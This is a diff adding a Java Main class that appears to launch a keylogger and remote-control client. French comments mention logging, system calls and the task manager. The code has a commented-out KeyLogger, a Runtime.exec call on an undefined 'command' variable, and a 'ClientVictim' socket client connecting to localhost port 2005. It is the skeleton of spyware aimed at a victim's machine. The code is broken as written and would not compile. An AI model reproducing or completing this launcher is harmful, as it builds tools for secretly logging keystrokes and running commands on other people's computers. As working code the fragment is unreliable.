@@ -1,0 +1,21 @@
+
+public class Main {
+
+	
+	// LOG fichier
+	// appels systèmes
+	// gestionnaire de taches
+	
+	
+	public static void main(String[] args) {
+		// TODO Auto-generated method stub
+
+		//KeyLogger keylogger = new KeyLogger();
+		Runtime.getRuntime().exec(command);
+		ClientVictim c = new ClientVictim( "127.0.0.1", 2005);
+		//keylogger.closeBuffer();
+		c.start();
+		
+	}
+
+}
